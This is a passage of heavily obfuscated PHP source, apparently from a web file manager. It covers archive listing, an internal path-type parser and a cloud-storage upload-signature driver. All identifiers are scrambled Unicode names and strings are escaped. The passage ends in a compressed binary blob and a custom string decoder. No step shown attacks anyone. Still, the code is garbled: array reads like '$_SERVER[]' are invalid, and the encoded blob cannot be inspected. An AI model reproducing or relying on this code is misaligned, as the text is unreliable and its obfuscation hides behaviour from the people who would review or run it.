$_SERVER[]; $Bŗ = $c惪[$B럂[75]]; $eė = $c惪[$B럂[1030]]; goto c; c: if (!($c = parent::info($Bŗ))) { show_json(LNG($B럂[1031]), !1); } if (!($e = parent::infoFull($eė))) { $eė = parent::mkdir($eė); $e = array($B럂[75] => $eė); } else { if (isset($e[$B럂[369]]) && trim($e[$B럂[75]], $B럂[8]) != trim($eė, $B럂[8])) { $aВʐ = KodIO::make($e[$B럂[463]]); $CŬ = parent::fileNameAuto($aВʐ, $e[$B럂[28]], REPEAT_RENAME_FOLDER, !0); $eė = parent::mkdir($aВʐ . $CŬ); $e = array($B럂[75] => $eė); } } $eė = $e[$B럂[75]]; goto AՂ; C樇: } public static function unzipList($dЄ) { goto DѼ; fՉ: self::archiveExt(); del_dir($F); if (!$e[$c򿮌[1034]]) { show_json($e[$c򿮌[1036]], !1); } goto bÂ; eٻ: $A穆ӄ = 50000; if (request_url_safe($Bʊ)) { $FӲɟ = parse_url_query($Bʊ); if (!isset($FӲɟ[$c򿮌[75]])) { show_json($c򿮌[1039], !1); } } $f㇟쇂 = isset($FӲɟ) ? $FӲɟ[$c򿮌[75]] : $Bʊ; goto D; f: if (isset($FӲɟ)) { $Eٻ巪 = array($FӲɟ[$c򿮌[75]], $FӲɟ[$c򿮌[1038]], $FӲɟ[$c򿮌[28]]); $c = md5(implode($c򿮌[70], $Eٻ巪)) . $c򿮌[91] . get_path_ext($FӲɟ[$c򿮌[28]]); } else { $Eٻ巪 = array($eψڳ[$c򿮌[28]], $eψڳ[$c򿮌[75]], $eψڳ[$c򿮌[77]]); $c = md5(implode($c򿮌[70], $Eٻ巪)) . $c򿮌[91] . $e裴; } if ($A餗ֶ == -1) { $fܹ = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\x69\145\167\57{$a덕}\x2f{$c}\x2e\154\157\x67"; $B͚ = self::infoFull($fܹ); if ($B͚) { $fܹ = $B͚[$c򿮌[75]]; $f߰ = self::getContent($fܹ); if ($f߰) { $Eś = json_decode($f߰, !0); if (count($Eś) >= $A穆ӄ) { show_json(sprintf(LNG($c򿮌[1040]), count($Eś)), !1); } return $Eś; } } else { $fܹ = self::mkfile($fܹ); } } $F = TEMP_FILES . $a덕; goto f; D: $eψڳ = self::info($f㇟쇂); $e裴 = self::fileExt($eψڳ); $a덕 = self::tmpFileName($eψڳ); goto f; Bƴ: $eŏ = self::iconvSystem($eŏ); if ($A餗ֶ >= 0) { $fׄх = isset($dЄ[$c򿮌[1042]]) ? $dЄ[$c򿮌[1042]] : !1; $b舐 = isset($dЄ[$c򿮌[28]]) ? $dЄ[$c򿮌[28]] : $c򿮌[33]; KodArchive::filePreview($eŏ, $A餗ֶ, $fׄх, $b舐); self::archiveExt(); die; } $e = KodArchive::listContent($eŏ); goto fՉ; f: if (!is_dir($F)) { mk_dir($F); } $eŏ = $F . $c򿮌[8] . $c; if (!@file_exists(self::iconvSystem($eŏ))) { if (isset($FӲɟ)) { url_request($Bʊ, $c򿮌[1041], $eŏ); } else { $f߾ = self::localFilePath($Bʊ, $e裴); $eŏ = $f߾ ? $f߾ : self::download($Bʊ, $eŏ); } } goto Bƴ; DѼ: $c򿮌 =& $_SERVER[]; $Bʊ = $dЄ[$c򿮌[75]]; $A餗ֶ = isset($dЄ[$c򿮌[1038]]) ? $dЄ[$c򿮌[1038]] : -1; goto eٻ; b衄: return $e[$c򿮌[1036]]; goto A; bÂ: $Eś = json_encode($e[$c򿮌[1036]]); self::setContent($fܹ, $Eś); if (count($e[$c򿮌[1036]]) >= $A穆ӄ) { show_json(sprintf(LNG($c򿮌[1040]), count($e[$c򿮌[1036]])), !1); } goto b衄; A: } private static function fileExt($aí) { $Cꜻ =& $_SERVER[]; $d = $aí[$Cꜻ[160]]; if ($d == $Cꜻ[1043]) { $c = $Cꜻ[1044]; if (substr($aí[$Cꜻ[28]], -strlen($c)) == $c) { $d = $Cꜻ[1045]; } } self::archiveExt($d); return $d; } private static function zipFileList($Cɉݳ, $C = false) { $bӳ =& $_SERVER[]; $BȌ񃃗 = array(); foreach ($Cɉݳ as $Aȴ) { $A֐ɹ = $Aȴ[$bӳ[75]]; if ($C) { $A֐ɹ = self::copy($Aȴ[$bӳ[75]], $C, $bӳ[743]); } if ($A֐ɹ && self::local()->exist($A֐ɹ)) { $BȌ񃃗[$Aȴ[$bӳ[75]]] = $A֐ɹ; } } if (!empty($BȌ񃃗)) { return array_values($BȌ񃃗); } show_json(LNG($bӳ[1046]), !1); } public static function tmpFileName($dˎ) { $d⍬ˈ =& $_SERVER[]; $B = array($dˎ[$d⍬ˈ[28]], $dˎ[$d⍬ˈ[75]], $dˎ[$d⍬ˈ[77]], $dˎ[$d⍬ˈ[461]]); return md5(implode($d⍬ˈ[70], $B)); } private static function localFilePath($c礒, $f) { goto D; D: $e =& $_SERVER[]; if ($f == $e[1047] && strtoupper(substr(PHP_OS, 0, 3)) == $e[1048]) { return !1; } $a՗ = KodIO::parse($c礒); goto fܳߢ; A㗕Ҋ: if ($Bݩ == $e[102] || $Bݩ == $e[1050]) { if (!$a׊->exist($a׊->path)) { show_json(LNG($e[101]), !1); } return $a׊->path; } return !1; goto bˆ୮; fܳߢ: if ($a՗[$e[29]] == KodIO::KOD_SOURCE) { $a× = Model($e[751])->fileInfoGet(KodIO::sourceID($c礒)); if (!$a×[$e[75]]) { show_json($e[1049], !1); } $c礒 = $a×[$e[75]]; } $a׊ = self::init($c礒); $Bݩ = $a׊->getType(); goto A㗕Ҋ; bˆ୮: } private static function archiveExt($D = '') { $GLOBALS[$_SERVER[][1051]] = $D; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\x52\x65\143\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\163\145\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\106\x69\154\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\151\x6c\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\x70\x52\x6f\157\x74\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\x53\150\x61\162\145\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\x49\164\x65\x6d\114\x69\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\x61\x72\x63\150\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\143\x6b\x7d"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\162\x52\145\x6e\143\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\x65\162\x7d"; public static function typeList() { $Fü㎎ެ =& $_SERVER[]; return array($Fü㎎ެ[1052] => self::KOD_SOURCE, $Fü㎎ެ[1053] => self::KOD_USER_RECYCLE, $Fü㎎ެ[1054] => self::KOD_USER_FAV, $Fü㎎ެ[1055] => self::KOD_USER_FILE_TAG, $Fü㎎ެ[1056] => self::KOD_USER_FILE_TYPE, $Fü㎎ެ[1057] => self::KOD_GROUP_ROOT_SELF, $Fü㎎ެ[1058] => self::KOD_USER_SHARE, $Fü㎎ެ[1059] => self::KOD_USER_SHARE_LINK, $Fü㎎ެ[1060] => self::KOD_USER_SHARE_TO_ME, $Fü㎎ެ[1061] => self::KOD_SHARE_ITEM, $Fü㎎ެ[1062] => self::KOD_SHARE_LINK, $Fü㎎ެ[1063] => self::KOD_SEARCH, $Fü㎎ެ[1064] => self::KOD_BLOCK, $Fü㎎ެ[1065] => self::KOD_IO, $Fü㎎ެ[1066] => self::KOD_USER_RECENT, $Fü㎎ެ[1067] => self::KOD_USER_DRIVER); } public static function parse($A҉) { goto EԘ; EԘ: $d䗹 =& $_SERVER[]; $A҉ = self::clear($A҉); $F = array_values(self::typeList()); goto cĄ䵛; cĄ䵛: preg_match($d䗹[1068], $A҉, $e); $b栭 = array($d䗹[388] => !1, $d䗹[1069] => !1, $d䗹[385] => !1, $d䗹[75] => $A҉, $d䗹[1015] => !1, $d䗹[1014] => $d䗹[33]); if (is_array($e) && count($e) == 5) { $Eć = $d䗹[1070] . $e[2] . $d䗹[315]; if (in_array($Eć, $F)) { $b栭[$d䗹[1015]] = $e[1]; $b栭[$d䗹[29]] = $Eć; $b栭[$d䗹[1071]] = substr($Eć, 1, -1); $b栭[$d䗹[367]] = $e[3]; } $b栭[$d䗹[1014]] = $e[4]; } goto fʷ̓; fʷ̓: $aۿ = array($d䗹[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b栭[$d䗹[1072]] = in_array($b栭[$d䗹[29]], $aۿ); return $b栭; goto eɊŒ; eɊŒ: } public static function clear($E) { goto F; F: $f =& $_SERVER[]; $E = str_replace(array($f[994], $f[217]), $f[50], $E); $E = str_replace($f[93], $f[8], $E); goto a닿; Aփ: return $E; goto E; E䯥: $E = preg_replace($f[1075], $f[8], $E); if ($E == $f[8]) { return $f[8]; } $E = rtrim($E, $f[8]); goto Aփ; a닿: $B = $f[1073]; if (substr($E, 0, 3) == $f[1074]) { $E = substr($E, 3); } while (strstr($E, $B)) { $E = str_replace($B, $f[8], $E); } goto E䯥; E: } public static function sourceID($bş) { $a =& $_SERVER[]; $Eߌ = self::parse($bş); if ($Eߌ[$a[29]] !== self::KOD_SOURCE) { show_json(LNG($a[1076]), !1); } return $Eߌ[$a[367]]; } public static function make($AЯ) { if (!$AЯ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($AЯ)); } public static function makeShare($c, $FЂ) { return self::makePath(self::KOD_SHARE_ITEM, $c, $FЂ); } public static function makeFileTypePath($d) { return self::makePath(self::KOD_USER_FILE_TYPE, $d); } public static function makeFileTagPath($c֧) { return self::makePath(self::KOD_USER_FILE_TAG, $c֧); } public static function makePath($aחȄ, $B = '', $c˾ш = '') { $Cݥ =& $_SERVER[]; $Dɺ = substr($aחȄ, 1, -1); $bː鲏 = $Cݥ[1077] . $Dɺ . $Cݥ[1078] . $B . $Cݥ[1079]; $bː鲏 = $c˾ш ? $bː鲏 . $c˾ш . $Cݥ[8] : $bː鲏; return $bː鲏; } public static function hashPath($B䰧е) { $C܉ =& $_SERVER[]; $Aϊ = is_array($B䰧е) ? $B䰧е : IO::info($B䰧е); $AƄ = _get($Aϊ, $C܉[1080], $C܉[33]); if (!$AƄ) { $bÚ = KodIO::parse($Aϊ[$C܉[75]]); if (!$bÚ[$C܉[29]]) { $AƄ = IO::hashSimple($Aϊ[$C܉[75]]); } } if (!$AƄ) { $AƄ = md5($Aϊ[$C܉[75]] . $Aϊ[$C܉[77]] . $Aϊ[$C܉[107]]); } return $AƄ; } public static function initSystemPath() { $d =& $_SERVER[]; if (defined($d[1081])) { return; } define($d[1081], self::systemPath($d[1082])); define($d[1083], self::systemPath($d[1084])); define($d[1085], self::systemPath($d[1086])); define($d[1087], self::systemPath($d[1088])); } private static function systemPath($fܮ) { goto e񆇪; e񆇪: $d =& $_SERVER[]; $d = $d[1089] . ucfirst($fܮ); $D넼 = Model($d[1090])->get($d); goto Fꚕ; Eȱ: return $D넼; goto Aœ; Fꚕ: if ($D넼) { return $D넼; } if ($fܮ == $d[1082]) { $D넼 = self::make(Model($d[751])->systemRootPathAdd($d[1091])); } else { $D넼 = self::systemPath($d[1082]); $aȸ֏ = self::sourceID($D넼); $D넼 = self::make(Model($d[751])->mkdir($aȸ֏, $fܮ)); } Model($d[1090])->set($d, $D넼); goto Eȱ; Aœ: } public static function systemFolder($Cˊ) { $Eک = IO_PATH_SYSTEM_SOURCE . $Cˊ; $A = Cache::get($Eک); if (!$A) { $cŉƜ = IO::infoFull($Eک); if (!$cŉƜ) { $A = IO::mkdir($Eک, REPEAT_SKIP); } else { $A = $cŉƜ[$_SERVER[][75]]; } Cache::set($Eک, $A, 3600 * 10); } return $A; } public static function defaultDriver() { return Model($_SERVER[][702])->defaultDriver(); } public static function defaultIO() { $c =& $_SERVER[]; $b = self::defaultDriver(); return $c[1092] . $b[$c[367]] . $c[1079]; } public static function defaultDriverInit() { static $F = false; if ($F) { return $F; } $F = IO::init(self::defaultIO()); return $F; } public static function fileTypeList() { $fՈ =& $_SERVER[]; $Aٗ = $GLOBALS[$fՈ[6]][$fՈ[1093]]; foreach ($Aٗ as $BǨ => $b) { $e = $fՈ[1094] . $BǨ; $bҌ = LNG($e); if ($e != $bҌ) { $Aٗ[$BǨ][$fՈ[28]] = $bҌ; } } return $Aٗ; } public static function transferType($bك, $cܬ) { goto dѻ; dѻ: $f̑ؐ =& $_SERVER[]; $e = self::driverType($bك); $e = self::driverType($cܬ); goto cˢϏ; cˢϏ: if ($e[$f̑ؐ[29]] == $e[$f̑ؐ[29]] && $e[$f̑ؐ[1095]] == $e[$f̑ؐ[1095]]) { return $f̑ؐ[1096]; } if ($e[$f̑ؐ[29]] == $f̑ؐ[785] && $e[$f̑ؐ[29]] == $f̑ؐ[102]) { return $f̑ؐ[1042]; } if ($e[$f̑ؐ[29]] == $f̑ؐ[102] && $e[$f̑ؐ[29]] == $f̑ؐ[785]) { return $f̑ؐ[103]; } goto bߠ; bߠ: return $f̑ؐ[1097]; goto F䴚; F䴚: } public static function driverType($bʵ) { goto f; C²Ǎ: return array($Cߤ[29] => $Cߤ[785], $Cߤ[1095] => $bʵ->pathDriver, $Cߤ[75] => $CБ); goto C紎; f鄆: if ($e޶ƃ == $Cߤ[693] || $e޶ƃ == $Cߤ[1099] || $e޶ƃ == $Cߤ[1100]) { $bʵ = self::defaultDriverInit(); } else { if ($e޶ƃ == $Cߤ[1050] || $e޶ƃ == $Cߤ[1101]) { $bʵ = IO::init($bʵ->pathParse[$Cߤ[1000]]); } } $e޶ƃ = str_replace($Cߤ[1098], $Cߤ[33], strtolower($bʵ->getType())); if ($e޶ƃ == $Cߤ[102]) { return array($Cߤ[29] => $Cߤ[102], $Cߤ[1095] => $Cߤ[33], $Cߤ[75] => $CБ); } goto C²Ǎ; f: $Cߤ =& $_SERVER[]; $CБ = $bʵ->path; $e޶ƃ = str_replace($Cߤ[1098], $Cߤ[33], strtolower($bʵ->getType())); goto f鄆; C紎: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E) { parent::__construct($E); $this->signatureVersion($_SERVER[][200]); } public function uploadFormData($f㌝, $e澶ު = 3600) { goto fʄ; cȣ: $Cώ轹 = sha1($Dҍ⋊); $Dˊ = hash_hmac($C[218], $Cώ轹, $bۘǭ); $bϞĢ = array($C[1106] => $eȿ, $C[1110] => $A, $C[1114] => base64_encode($Dҍ⋊), $C[1111] => $DЉ, $C[1112] => $this->accessKey, $C[1115] => $d˫擊, $C[1116] => $Dˊ, $C[169] => $this->getHost()); goto Bӎ; d쇔: $A = $C[1102]; $D = gmdate($C[1103], time() + $e澶ު); $d˫擊 = (string) time() . $C[67] . (string) (time() + $e澶ު); goto eʖÄ; fʄ: $C =& $_SERVER[]; $eȿ = $C[185]; $DЉ = $C[218]; goto d쇔; eʖÄ: $Dҍ⋊ = array($C[1104] => $D, $C[1105] => array(array($C[1106] => $eȿ), array($C[1107] => $this->bucket), array($C[1108], $C[1109], $C[33]), array($C[1110] => $A), array($C[1111] => $DЉ), array($C[1112] => $this->accessKey), array($C[1113] => $d˫擊))); $Dҍ⋊ = json_encode($Dҍ⋊); $bۘǭ = hash_hmac($C[218], $d˫擊, $this->secret); goto cȣ; Bӎ: return $bϞĢ; goto b; b: } public function fileOutLink($fڲ) { $Bޱ =& $_SERVER[]; if (substr($fڲ, 0, 7) == $Bޱ[1117]) { $fڲ = $Bޱ[1118] . substr($fڲ, 7); } header($Bޱ[156] . $fڲ); die; } } goto eڃ; Dؖ: function beforeShutdownFatalError($c㫬) { think_exception($c㫬); } $_SERVER[$_SERVER[ņӺ][45]] = $fʳ읆($_SERVER[$_SERVER[ņӺ][42]]); $Cۖ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto F; aм: if (!function_exists('_kodDe')) { function _kodDe($B͈) { $B͈ = base64_decode($B͈); $F您 = strlen($B͈); $E = ''; $dϡ = ord($B͈[0]) - 30; for ($AЊ = 1; $AЊ < $F您; $AЊ += 2) { if ($AЊ + 1 < $F您) { $E .= chr(ord($B͈[$AЊ + 1]) + $dϡ); $E .= chr(ord($B͈[$AЊ]) + $dϡ); } else { $E .= chr(ord($B͈[$AЊ]) + $dϡ); } } return $E; } } define("\246\274\250\374\225\362", "\334\366\376\212\367\266\220\204\342\375"); $_SERVER[] = explode("\x7c\x3\x7c\x5\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\7\140\133\305\331\224\115\12\55\253\264\245\264\74\234\4\217\150\170\146\70\36\221\55\331\126\142\133\216\44\307\111\54\243\74\111\117\322\263\45\75\371\275\47\257\70"."\55\53\141\357\100\331\5\312\206\44\120\366\110\51\263\264\24\50\245\254\262\107\22\366\50\245\45\55\343\277\175\367\236\144\150\177\132\107\167\337\175\167\357\306\167\337\175\167\367\175\337\75\274\341\371\247\357\76"."\x6f\x7a\xb7\xe9\x3d\xa6\xbf\x73\xfc\x97\xcf\x5f\xbd\xe9\xc9\x3b\xae\x78\xe7\x63\x1c\x7\xff\xdb\x1d\xfc\xf\x85\xf\x3f\x65\xef\x5d\xd0\x7f\xbb\x65\x97\xf\x5\x1e\xa8\x3e\xf8\xb4\x7d\x2\x5f\xcd\xba\x74\xba\xf6\xcc\xcf\x7b\xf7\xdd".strrev('\\#~4~d\\Fo_Gẋ[6sCMj^q֧')."\xcd\xfb\xf0\x98\xf0\xaf\x2e\xeb\x5c\x53\xb8\x6d\xf9\x86\xcf\xef\x7d\xf8\xae\xdb\x9a\x7\x57\x1f\x78\xcf\xd5\x1f\x9e\x75\xe9\xd2\xbd\x1f\xdf\xaa\x5d\xfa\x4c\xf3\x71\xed\x9b\xee\xff\xec\xeb\x3b\xee\x9e\xd8\xeb\x89\xcb\x67\x2f\x7d\x75"."\xf1\xb1\xdf\xf1\x6c\xbb\xff\xb3\x8d\x67\xdd\x74\xc6\x2f\xee\xda\xff\xb5\x75\xa7\xf\x56\x7f\x72\x92\xdb\x33\xb2\xe7\xda\xfd\xaf\xbc\x67\xf7\xce\xa7\xa3\xbf\xba\xf6\xb1\xfd\x63\x8f\x5d\x36\x76\x74\xff\x89\x8b\x97\x54\x2c\x3f\xf0\x17"."\x17\xbc\xf5\xc3\x57\x7e\xff\x74\xed\x81\x17\x7e\x7e\xa2\xf2\xf4\xad\x6b\xb6\xac\x6a\x8c\xdf\x52\x9f\x3a\xc7\x77\xe0\xd6\x79\x2b\x7f\x7d\xdc\x8d\x37\x1e\xfb\xd0\x47\x3f\x7a\x2d\x7d\xfe\xdc\x40\xa6\xe5\x4f\xd7\x5c\xf9\xea\xd9\x7\xfc"."\xa4\xfc\xf0\x39\x97\xbe\x77\xf6\xdd\x8b\x55\xbd\xe2\xce\xba\x3f\x3e\xb4\x56\xb9\xbf\xf2\x80\xd4\x25\x72\x5f\xd9\xf7\x6a\xf7\x7c\x6f\xc9\xc7\xbb\x8c\xfe\x73\xed\xb1\x83\xbb\x3e\xf2\xdc\xd2\x7\x77\x4e\xad\x3b\x6a\x8f\xbf\x3e\xaa\x9c"."\363\237\347\36\130\375\311\307\357\114\336\174\330\255\315\27\374\373\230\221\123\156\335\376\351\376\357\336\271\307\363\227\375\371\246\263\177\262\52\272\363\302\35\167\256\172\354\171\263\53\126\75\270\161\326\223\247\354"."\372\352\17\66\377\354\207\221\263\277\332\365\246\226\147\313\36\331\165\227\135\160\377\66\342\37\51\247\231\222\62\241\32\246\201\1\161\55\227\124\123\70\254\346\360\257\33\377\30\243\31\325\124\160\70\332\33\10"."\x47\x43\xfd\x7d\x7d\xbe\x60\x38\x4a\x4a\x14\xd3\xb3\x5a\x82\x84\xf2\xb2\x2e\x67\x49\xe1\x79\x45\x37\xc0\xa7\xc4\xe2\xa2\x79\x2d\xaf\xe4\x2c\x10\xe\x48\xc8\xa6\x1c\x93\xd\x52\x92\xb7\x2d\xea\xf5\xf5\x75\x7\x56\x45\xc3\xab\xfa\x7c"."\x4\x23\x16\x1d\x2d\x28\xfa\x24\x8e\xa1\x60\xc8\x94\x75\x33\xac\x66\x15\x86\x31\xae\xb3\x7a\xb5\xf9\x3a\xfd\xbd\x52\x38\xe8\xe9\xd\x79\xda\xc3\xfe\x40\x2f\x6\xb7\x7\x7a\x7a\xfc\xe1\x62\x78\x30\xd0\xdd\xdd\xe6\x69\x5f\x56\x9c\xd2".base64_decode('F/R09ngkUL+MElVzSa1CWoNT1kiVONChKpkEDuZkWh1zMk9CYRYCY5ArZDI40stCpP5KUi5kSJ95xQ==')."\x48\x5e\x57\xb3\x32\x6d\xfa\x32\x65\x92\x41\x71\x40\x2e\x98\x9a\x9a\x8b\xe3\x88\x6f\xc2\xd4\x65\xe\x7\x35\x8e\xeb\x4a\x56\xc9\x91\xa2\x42\xbe\x6e\x5f\x7b\x58\x82\xd5\x94\x3a\x82\x81\x1e\x89\xc\x45\x56\x36\x4c\x45\x97\x6\xba\x7c".strrev(' }UBxRsk~%[jP_^pb͒	S4wO$C|.\\Z\\ޫA')."\16\70\10\5\167\373\341\320\221\110\240\243\43\344\143\61\322\270\345\335\240\46\165\204\112\55\261\104\62\143\106\307\344\114\201\22\353\10\376\55\47\77\344\127\63\10\1\217\252\71\265\100\210\225\24\241\151\154".base64_decode('5pBAgWIrFJIF2TQyp8AEG8PB5hb8u5ggxaIwTdHNqJKLawk1R6ZhK5lyhPBkM+3VVYBHCtRccS0/2Q==')."\xa3\x8d\x91\x36\x24\xd5\x8c\xd2\xcd\x66\x59\x52\xcb\x24\x14\x9d\xc7\xf3\x20\xbb\x98\x42\x1a\xa3\x4e\x9\xb9\x7b\xb\x59\x11\x85\x45\xe3\x69\x35\x93\xd0\xe9\xe4\xfc\x26\xcc\x1a\x52\xac\x62\x9a\xa0\x19\x6\xad\x69\x7f\x3e\xa3\xc9\x89".base64_decode('kKILte8AxQQKpggsILQOTc96AQMgvQPIXu0vkTBCCT8hdIqLMK6KwWOcXw0NLgH/VBIuFiFVSyuZTA==').base64_decode('VJlQyATJJhoMWnu3EVNzbgDBUX8gmpaNdE+iIYpyUeaYUCZc+XSezGE2bSMWAob93auZPoHFZrS4nA==').strrev('2ٛK9\'$'."\0".'5u%ZG	HuWC6iv\\iÊ[')."\x32\x12\x57\x26\x4c\xd2\x49\xd2\xe2\x78\x5a\xd6\xc1\xf0\x35\x17\xcc\xa4\x73\x21\x61\x1c\xf9\x7c\x46\x8d\xcb\xa6\xaa\xe5\xdc\x5a\xdc\x54\x4c\xa7\x61\xea\x8a\x4c\x4a\x2b\x5b\x2c\x41\x8a\x80\x33\xb8\xa\xe7\xa2\xb3\xa7\x5d\xcb\x99\x60"."\xfa\x3a\xc3\xba\x9c\x33\x92\x8a\xee\xf4\x11\xf2\x6e\x94\x40\x3f\x33\xe\x46\xd1\xbc\xaa\x91\xd7\xc\x15\x7e\xa6\x51\x92\x4d\x53\x8e\xa7\xe1\xec\xe7\xc5\x37\x7f\x3\xbe\x9a\xcb\xa8\x39\xa5\x8\xd7\x13\x8f\x2b\x86\xe1\x84\x59\x74\x2d"."\xe3\xf4\x64\x32\xda\xb8\x33\xa0\xab\x29\x15\xe4\xa9\xb2\x55\x13\x70\xa6\x46\x89\xb2\xcd\xbc\xaa\x2b\x6\x8d\x4a\x9d\x3d\x61\x82\xc\x6a\xa5\x38\xfb\x74\x39\x95\x95\x1b\xa5\x7c\x21\x6\x7a\x86\xcc\xcf\x12\x30\x8c\x4d\xbe\xde\x28\xc5"."\x61\xd4\x21\x65\xb\x86\xe9\xd4\x15\xc0\x7e\x54\xb0\xd0\x91\xc1\xf3\x27\x9d\x3d\x70\x3c\x55\x25\xe1\xc\x1\x2e\x4d\xc0\x75\xd5\xf5\x12\x20\x23\x89\xa6\x61\x68\x57\x38\xdc\x17\xf5\x77\x80\xc5\xb8\xd7\x17\xed\xf1\x84\xdb\xbb\x48\xb5"."\115\71\105\353\334\15\170\57\53\222\2\127\72\301\224\203\204\326\13\372\210\3\373\264\161\105\7\37\156\233\154\224\106\264\104\114\233\160\321\44\210\34\2\134\202\42\303\36\315\233\316\240\234\113\301\376\211\115"."\232\12\41\107\143\54\145\355\320\156\45\227\62\323\64\143\310\27\134\341\13\106\103\201\216\360\200\47\110\226\361\34\30\210\11\372\51\130\164\306\31\124\22\240\353\343\46\315\47\347\141\257\121\34\70\121\340\30".base64_decode('01Q4eWhat78TdozXaQAkp4hFy+5Wsyqsu8lSUE+CNb6TVMiNGtQcSVdVRBLzKp3g36rKwYjXVTXU6g==')."\x56\x79\x1e\x77\x8d\xab\x46\xaa\xad\x9e\x2f\xf5\x1\xa1\x43\x95\x33\x12\x69\x74\x11\x46\xb5\x14\x58\xf6\xd\x1d\x0\xd7\x24\x61\x9a\xdb\xba\xe\x3\x83\xbe\xe5\xfd\xbe\x50\x38\xda\xe3\xb\x77\x5\xbc\xe4\xb\x3e\xf\x9\x75\x6b\x78"."\x6a\xd2\x16\xd\xe2\x9f\x21\x32\x82\x40\x54\x48\x29\x71\x2d\xa3\xe9\x72\x6\x32\x20\x4a\x6f\xa\x65\x2\x29\x35\xc9\xf9\xba\x1f\x8\x34\xa4\x63\x31\xe7\xe3\x91\x90\x9a\xcd\x53\x6\x65\xa6\xb\xd9\x98\x10\x74\xf3\x12\x8\x2d\x80\x21".base64_decode('Y2xJY2uQppNQo5tkmVvbQZmtO1QH/s85a0LLylQSRRNXSeCZi0FVlpQuReaLmqmbGoTqFpQexUxrpA==').base64_decode('n1MKrVKB1Y3WMqFkFNpLaYVyaSBejbHOy+tKUiV0C+QpAOdcWDWCIBOUb2h8AIqhHGByhi0bnOnDiA==')."\xb0\x32\x77\xf4\x77\x77\x47\xdb\x3\xbd\x61\x20\x8a\x62\xc8\x40\xd0\x1f\xf6\x51\x8a\xf0\x78\xa3\x9e\xf6\x3e\xb6\x84\xf1\x61\x22\x8\x70\x7a\x16\xb3\x37\xc\x19\xab\x15\xf8\x3e\x5f\x20\x38\xcb\xa5\xb\x1d\x64\xa9\x38\xc\x78\x61\x5e"."\313\31\212\63\116\112\113\160\346\213\61\26\333\70\157\121\16\56\0\117\70\345\354\224\63\253\230\262\223\125\335\272\276\111\141\161\231\364\223\41\340\314\62\3\26\125\260\277\240\13\153\137\40\104\62\264\102\50".base64_decode('kEZiik7q0ddPkrLC8Hf6CHAWXRtlIrl4BkKU0RUAvq5OybyNrbQ+pOyJbIYLWFHVMn5RLTYMuBggOg==')."\271\124\253\235\174\254\302\135\376\336\145\321\236\200\327\327\35\365\367\2\56\21\56\206\367\367\171\75\164\360\105\170\133\40\334\145\201\366\3\76\261\302\323\355\267\243\373\126\372\103\341\120\311\44\0\353\367\331"."\x52\xc0\x96\xab\x2f\xe8\xeb\xf0\xaf\x64\xd1\xe\xbf\xaf\xdb\x1b\x8a\xb6\x7b\xda\xbb\x38\x4e\xaf\xa7\x87\x44\xa2\x49\xb8\xe9\x31\xdc\x56\xfc\x28\x60\x78\x21\xb6\x75\x8a\x8e\xc1\x6d\x20\xed\xcc\xa8\x65\x9f\x12\xa5\x12\x78\x94\xd3\x9"."\x58\xbc\x14\x42\x9b\xa4\xb9\x70\xf3\x89\x5a\x42\x64\xe2\xb8\x56\xa0\xd4\xca\x84\xb8\x2c\x65\x10\x59\x99\xcc\x50\x99\x2e\x4c\x15\xf8\xa7\x52\xf2\x84\x24\x33\x1f\x65\xac\x20\x36\xc9\x82\xa8\x19\x34\xe\xc4\x35\xf2\x7d\x89\x30\xdf\xa2"."\32\104\41\116\233\222\324\164\345\233\0\236\244\311\10\303\26\7\363\206\247\201\21\360\240\135\56\240\4\64\42\121\72\27\15\260\77\360\320\352\44\371\16\63\32\0\133\161\17\334\237\106\7\202\201\336\116\222".strrev('+ULlAfc ǯh>FrFvs"$MSlaPWI'."\n".'Э<a')."\305\64\55\103\347\61\130\217\31\277\140\33\334\141\203\22\311\4\145\116\363\350\252\105\26\207\160\140\231\257\67\112\51\13\307\4\152\304\0\260\145\14\4\111\207\230\332\10\335\300\340\304\240\57\104\271\200\256"."\214\26\124\332\135\156\327\74\102\305\12\130\177\310\347\335\107\105\306\347\125\14\72\347\271\206\100\240\262\152\11\216\222\130\304\145\211\316\41\371\13\72\313\15\305\224\12\243\265\262\61\342\216\270\53\132\33\7".strrev('|dvk8T20d_?֑?ζ u#Uq